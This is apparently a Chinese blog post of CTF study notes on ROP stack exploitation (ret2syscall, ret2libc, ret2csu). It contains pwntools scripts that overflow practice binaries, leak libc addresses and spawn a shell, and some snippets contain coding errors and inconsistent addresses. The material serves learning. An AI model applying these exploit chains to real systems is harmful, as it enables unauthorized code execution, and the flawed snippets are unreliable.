python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&#x27;/var/run/vmblock-fuse/blockdir/OMFuQ4/rop&#x27;</span>)  //这文件我直接拖进去的文件地址好长<br><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806eb90</span><br>binsh = <span class="hljs-number">0x080be408</span><br>pop_eax = <span class="hljs-number">0x080bb196</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span>, pop_edx_ecx_ebx, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh,pop_eax, <span class="hljs-number">0xb</span>, int_0x80])<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="关于linux系统调用的实现"><a href="#关于linux系统调用的实现" class="headerlink" title="关于linux系统调用的实现"></a>关于linux系统调用的实现</h4><h5 id="系统调用的步骤"><a href="#系统调用的步骤" class="headerlink" title="系统调用的步骤"></a>系统调用的步骤</h5><p>Linux的系统调用需要通过 int 80 实现，用系统调用号来区分入口函数。操作系统实现调用的基本过程如下：</p><ul><li>应用程序调用库函数</li><li>API将系统调用号存入EAX，然后通过中断调用时系统进入内核态</li><li>内核中的中断处理函数根据系统调用号，调用到对应的内核函数（系统调用）</li><li>系统调用完成相应的功能，将返回值存入EAX，返回到中断处理函数</li><li>中断处理函数返回到API</li><li>API将EAX返回给应用程序</li></ul><blockquote><p>系统调用号：</p><p>在Linux系统中，每个系统调用都被赋予一个系统调用号。系统调用号一旦分配就不能再有任何变更，否则编译好的应用程序就会崩溃；此外，如果一个系统调用被删除，它所占用的系统调用号也不允许被回收利用。这样，通过系统调用号就可以关联系统调用。</p><p>比如32位下调用 execve(“&#x2F;bin&#x2F;sh”,NULL,NULL) ，Linux系统调用通过int 0x80指令开始系统调用，exceve对应的系统调用号是0xb</p></blockquote><h5 id="举个栗子🌰："><a href="#举个栗子🌰：" class="headerlink" title="举个栗子🌰："></a>举个栗子🌰：</h5><p>函数<code>execve(&quot;/bin/sh&quot;,null,null)</code></p><p>其函数调用过程应该是：</p><ul><li>系统调用号存入EAX，即eax应该是0xb</li><li>依次传入三个参数，即ebx指向&#x2F;bin&#x2F;sh的地址或者sh的地址；ecx为0；edx为0</li></ul><p>我们可以知道系统在调用时会用到eax，ebx，ecx，edx四个寄存器，那么我们就可以将以上的内容写为<code>int 0x80(eax,ebx,ecx,edx)</code>。只要把对应的参数放到相应的寄存器中，再执行int 0x80就可以执行相应的系统调用。</p><p>那该怎么控制呢？🤨 <del>把刀架在寄存器脖子上</del></p><p>我们们可以使用pop和ret指令组合来控制寄存器的值以及执行方向。</p><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>ROPgadget和ropper，两个都可可以找，目标汇编代码片段，ROPgadget速度更快但是查找结果并不完整；ropper速度相对较慢但查找结果精准。</p><p>对于静态生成的程序，我们可以不用每一次都一条一条的去找命令，可以直接生成一条ROP链</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">ropper</span> <span class="hljs-literal">--</span><span class="hljs-comment">file inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">chain execverropper</span> <span class="hljs-literal">--</span><span class="hljs-comment">file inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">chain execve</span><br><span class="hljs-comment">ROPgadget</span> <span class="hljs-literal">--</span><span class="hljs-comment">binary inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">ropchain</span><br></code></pre></td></tr></table></figure><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>ret2libc即控制函数执行libc中的函数，通常是返回值某个函数的plt处或者函数的具体位置（即函数对应的got表项的内容）。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，我们需要知道 system 函数的地址。</p><h4 id="🌰-1-2"><a href="#🌰-1-2" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>CTF Wiki 的题，超简单的所有信息都给出的新手题目 <del>我都会做</del></p><p>首先查看安全保护</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-39-30.png"></p><p>源程序为 32 位，开启了 NX 保护。看一下程序源代码，确定栈溢出利用位置</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-42-44.png"></p><p>gets可以栈溢出。</p><p>我们可以找到system函数和’bin&#x2F;sh’字符串</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-46-14.png"></p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-48-21.png"></p><p>我们就可以直接返回 system 的地址</p><p>计算偏移量为112，构造payload。需要注意，我们调用system函数，会有一个对应的四字节的返回地址，我们需要将其填充后再附上我们的 ‘&#x2F;bin&#x2F;sh’ 字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process( <span class="hljs-string">&#x27;/var/run/vmblock-fuse/blockdir/Cm8v0D/ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br><br>payload=flat([<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span>, system_plt, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>, binsh_addr])<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="🌰-2-2"><a href="#🌰-2-2" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p>同样是32位的程序开启NX保护，有一个gets可以利用。有system函数但没有 ‘&#x2F;bin&#x2F;sh’ 字符串，但是有一个gets()函数，我们可以自己读取。同时我们在.bss段发现一个buf可以传参，可以把字符串填在这里</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-44-44.png"></p><p>编写exp：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br><br>r=process(&#x27;/var/run/vmblock-fuse/blockdir/wD0Lp7/ret2libc2&#x27;)<br><br>buf_addr = 0x804A080<br>gets_addr = 0x8048460<br>sys_addr = 0x8048490<br><br>payload = flat( [&#x27;A&#x27;*112, gets_addr, sys_addr, buf_addr, buf_addr] )<br>r.sendline(payload)<br>r.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure><p>payload解释：</p><ul><li><code>&#39;A&#39;*112</code>：填充112个字符’A’溢出缓冲区，覆盖返回地址。</li><li><code>gets_addr</code>：将<code>gets</code>函数的地址作为原本程序的gets()函数的返回地址，控制程序流程跳转到<code>gets</code>函数。</li><li><code>sys_addr</code>：<code>system</code>函数的地址，将作为<code>gets</code>函数返回后的下一个地址，控制程序流程跳转到<code>system</code>函数。</li><li><code>buf_addr</code>：缓冲区的地址，作为<code>system</code>函数的参数，传递给<code>system</code>函数的命令字符串所在的内存地址。</li><li><code>buf_addr</code>：再次使用缓冲区的地址，作为<code>gets</code>函数的参数，使得<code>gets</code>函数将用户输入的命令字符串写入到缓冲区。</li></ul><h4 id="🌰-3"><a href="#🌰-3" class="headerlink" title="🌰_3:"></a>🌰_3:</h4><p>这次system也没了🤨，其他的保护和漏洞都和例一例二一样。除此之外，题目中又给了一个 libc.so 动态链接库。</p><p>那怎么得到system的地址呢？</p><p>补课时间到！</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，<a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>除此之外我们还要知道，A 真实地址 (内存物理地址) - A 偏移地址 &#x3D; B 真实地址 (内存物理地址) -B 偏移地址 &#x3D; 基地址。也就是说，<strong>B的真实地址&#x3D;基地址+B的偏移地址</strong>。</p><p><strong>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</strong></p><p>那该如何获得已知函数的地址呢？</p><p>got表泄露！输出某个函数对应的got表内容，注意libc的延迟绑定机制，got表中只有已经执行过的函数有真实地址，我们需要泄露已经执行过的函数地址。再在程序中查询偏移进一步获得system地址。</p><p>但是！这样太麻烦啦我们可以用工具：<a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a> </p><p>exp：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br><br>sh = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>got_puts = elf.got[&#x27;puts&#x27;]<br>got_libc_startmain = elf.got[&#x27;__libc_start_main&#x27;]<br>main = elf.symbols[&#x27;main&#x27;]<br><br>payload1 = flat( [b&#x27;A&#x27;*112, puts_plt, main, got_puts] )<br>sh.sendlineafter(&#x27;!?&#x27;, payload1)<br>puts_addr = u32(sh.recv(4))<br><br><span class="hljs-comment"># libc6_2.27-3ubuntu1.2_i386</span><br>libc_puts = 0x67c10 <span class="hljs-comment">#offset</span><br>libc_system = 0x3d250<br>libc_binsh = 0x17e3cf<br><br>libc_base = puts_addr - libc_puts<br>system_addr = libc_base + libc_system<br>binsh_addr = libc_base + libc_binsh<br><br>payload2 = flat( [b&#x27;A&#x27;*112, system_addr, 0xcafebabe, binsh_addr] )<br>sh.sendlineafter(&#x27;!?&#x27;, payload2)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>了解ret2csu之前先了解一下attached code的概念。</p><p>我们编译一个简单的只有一个main函数的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">include&lt;stdio.h&gt;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(jint argc,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看可执行文件的函数符号：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nm</span> -<span class="hljs-keyword">a</span> [filename] | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;t\|T&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-28_20-37-10.png"></p><p>可以发现除了 main 函数还有很多其它函数，这些函数是编译器附加到可执行文件中的，称之为 attached code 。这些 attached code 在main 函数之前执行，负责加载或者链接库文件。我们可以从 attached code 中寻找可以利用的 gadgets。</p><p>我们利用 <code>objdum -D [filename] </code>命令查看文件反汇编代码可以看到 <code>__libc_csu_init()</code> 函数中存在以下gadget：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-28_20-50-34.png"></p><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 <code>__libc_csu_init</code> 中的 gadgets。我们可以在执行完第二个gadget后ret到第一个gadget，这样就可以控制很多关键寄存器的值。</p><p>需要注意的是，这种方法不能控制rax的值，也就无法进行系统调用，因为系统调用号在rax里。但我们可以通过write等函数泄露got表中的函数地址，然后计算出libc地址。</p><p>有以下几种利用场景：</p><ul><li>ret2csu泄露libc地址后利用libc中的gadget</li><li>ret2csu配合pop rax;syscall;等gadget直接getshell</li><li>开启pie的情况下，利用offset2lib进行ret2csu,或者直接利用libc中的gadget getshell</li></ul><blockquote><p>offset2lib简单来说就是泄露任意代码段地址即可推得所有共享库地址,因为共享库之间的offset是固定的.</p></blockquote><h4 id="🌰-1-3"><a href="#🌰-1-3" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>题目链接：<a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5%E3%80%82">https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5。</a></p><p>题目没有开启pie和canary保护。</p><p>蒸米师傅给了源码，我们自己拖到 ida 里也能判断出代码的基本逻辑，main() 函数里还有一个 <code>vulnerable_function()</code> 函数 ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>];<br>read(STDIN_FILENO, buf, <span class="hljs-number">512</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>write(STDOUT_FILENO, <span class="hljs-string">&quot;Hello, World/n&quot;</span>, <span class="hljs-number">13</span>);<br>vulnerable_function();<br>&#125;<br></code></pre></td></tr></table></figure><p>在read处有明显的栈溢出可以利用。<code>.plt</code> 表里就只有write函数和read函数。</p><p>我们的目的是调用 <code>system(&quot;/bin/sh&quot;)</code> ，可以先泄露出libc函数的地址，用write打印出来，通过计算偏移就可以求出system函数的地址。然后使用read函数将真实的system函数地址和&#x2F;bin&#x2F;sh字符串写入bss段，最后调用system函数即可。</p><p>我们知道在64位的程序中，前六个参数使用寄存器RDI, RSI, RDX, RCX, R8和 R9传递</p><p>在__libc_csu_init()函数中有可以利用的gadgets</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-19_10-16-23.png"></p><p>我们控制rbx,rbp,r12,r13,r14和r15的值，再将r15的值赋值给rdx，r14的值赋值给rsi，r15的值赋值给edi。简单来说对应关系就是:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">rdi</span>=  <span class="hljs-built_in">edi</span> = <span class="hljs-built_in">r13</span>,  <span class="hljs-built_in">rsi</span> = <span class="hljs-built_in">r14</span>, <span class="hljs-built_in">rdx</span> = <span class="hljs-built_in">r15</span><br></code></pre></td></tr></table></figure><p>随后就会调用 <code>call qword ptr [r12+rbx*8]</code> 。这条指令的含义是向 <code>[r12+rbx*8]</code> 间接寻址，跳转到所指的函数地址。我们就可以将rbx赋值为0，这样的寻址结果就是r12所指向的地址。</p><p>接下来的汇编代码片段含义为：执行call指令结束后，程序对rbx加一，然后对比rbx和rbp的值，如果相等就会继续向下执行。为了让rbx和rbp相等，我们需要将rbp赋值为1。</p><ul><li>payload-1</li></ul><p>利用 <code>read()</code> 读入我们的payload，<code>write()</code> 输出其got表中的地址。除了泄露地址，为了返回到原程序中重复利用 <code>buffer overflow</code> 的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。</p><p>总结一下我们要实现的payload需求：<code>rbx=0,rbp=1,r12=write_address,rdi=edi=r13,rsi=r14,rdx=r15</code>，<code>write(1,write_got,8)</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">csu_end</span> = <span class="hljs-number">0</span><span class="hljs-variable">x400606</span><br><span class="hljs-variable">csu_front</span> = <span class="hljs-number">0</span><span class="hljs-variable">x4005F0</span><br><span class="hljs-variable">got_write</span> = <span class="hljs-variable">level5.got</span>[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-variable">main_address</span> = <span class="hljs-number">0</span><span class="hljs-variable">x400564</span><br><br><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">got_write</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">8</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">got_write</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>write(1,write_got,8) 的含义为将 writ 函数的地址写入标准输出流中，写入的字节数为 8</p></blockquote><p>在收到write()在内存中的地址后，就可以计算出system()在内存中的地址。借此就可以将execve的地址以及“&#x2F;bin&#x2F;sh”读入到.bss段内存中。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">bin_sh_str</span> = <span class="hljs-string">&#x27;/bin/sh\0&#x27;</span><br><span class="hljs-variable">bss_addr</span> = <span class="hljs-number">0</span><span class="hljs-variable">x601040</span><br><br><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">read_got</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">16</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br><span class="hljs-variable">sh.send</span>(<span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">execve_addr</span>) + <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>read(0,bss_base,16) 的含义为从标准输入中读取最多 16 个字节的数据，并将数据存储到位于 <code>bss_base</code> 地址处的缓冲区中。</p></blockquote><p>最后调用执行 <code>execve(&#39;/bin/sh&#39;,0,0)</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span> + <span class="hljs-number">8</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br></code></pre></td></tr></table></figure><p>总的exp为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>level5 = ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>sh = process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br><br>write_got = level5.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = level5.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main_addr = level5.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>bss_base = level5.bss()<br>csu_front_addr = <span class="hljs-number">0x400600</span><br>csu_end_addr = <span class="hljs-number">0x40061A</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    payload = <span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">8</span>)<br>    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(<br>        r13) + p64(r14) + p64(r15)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    payload += p64(last)<br>    sh.send(payload)<br>    sleep(<span class="hljs-number">1</span>)<br><br><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span><br><span class="hljs-comment">## write(1,write_got,8)</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, write_got, <span class="hljs-number">8</span>, write_got, <span class="hljs-number">1</span>, main_addr)<br><br>write_addr = u64(sh.recv(<span class="hljs-number">8</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write_addr)<br>libc_base = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>execve_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;execve&#x27;</span>)<br>log.success(<span class="hljs-string">&#x27;execve_addr &#x27;</span> + <span class="hljs-built_in">hex</span>(execve_addr))<br><br><span class="hljs-comment">## read(0,bss_base,16)</span><br><span class="hljs-comment">## read execve_addr and /bin/sh\x00</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, read_got, <span class="hljs-number">16</span>, bss_base, <span class="hljs-number">0</span>, main_addr)<br>sh.send(p64(execve_addr) + <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment">## execve(bss_base+8,0,0)</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, bss_base, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bss_base + <span class="hljs-number">8</span>, main_addr)<br>sh.interactive()<br></code></pre></td></tr></table></figure><hr><p>很菜菜的ROP，把笔记收拾收拾发一下。</p><p>本来想说栈上全部东西都搞完再发，但最近github上的绿点点都少了就提前发一部分喽😢</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>函数调用约定</title>
    <link href="/2023/06/19/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/"/>
    <url>/2023/06/19/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/</url>
    
